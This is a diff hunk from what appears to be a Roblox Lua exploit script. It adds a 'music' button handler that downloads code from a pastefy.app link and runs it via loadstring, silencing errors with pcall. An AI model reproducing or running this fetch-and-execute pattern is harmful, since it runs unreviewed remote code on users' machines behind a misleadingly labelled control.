@@ -1264,3 +1264,10 @@ for _, player in ipairs(game.Players:GetPlayers()) do
 end
 
 game.Players.PlayerAdded:Connect(monitorPlayer)
+
+musicBtn.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/eyp4r7QU/raw"))()
+    end)
+end)
+
